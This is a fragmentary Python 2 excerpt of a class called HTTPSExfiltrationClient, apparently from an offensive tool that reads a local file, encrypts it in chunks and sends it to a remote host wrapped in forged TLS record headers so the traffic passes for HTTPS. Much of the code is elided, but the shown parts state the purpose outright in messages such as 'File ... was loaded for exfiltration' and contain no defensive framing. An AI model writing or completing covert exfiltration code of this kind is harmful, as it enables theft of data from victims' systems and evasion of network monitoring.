...
class HTTPSExfiltrationClient:
    ...
    def _createRealSocket(self):
        try:
            ...
            sys.stderr.write(
                "[!]\tCould not setup a connection to %s. Error:\n%s.\n"
                % (self.host, e)
            )
            return 1
    ...
    def sendFile(self, file_path):
        ...
        try:
            ...
            f.close()
            sys.stdout.write(
                "[+]\tFile '%s' was loaded for exfiltration.\n" % file_path
            )
        except IOError, e:
        ...
        if len(data) < self.max_size - 9:
            ...
            chunk_len = "\x00\x00"
            self.sock.send(
                "\x17\x03\x03" + chunk_len + "\x00\x01" + "\x00\x01" + enc_data
            )
        ...
        for chunk in chunks:
            ...
            if chunk_len == 1:
                ...
                this = (
                    "\x17\x03\x03" + chunk_len + this_packet + blocks_count + enc_data
                )
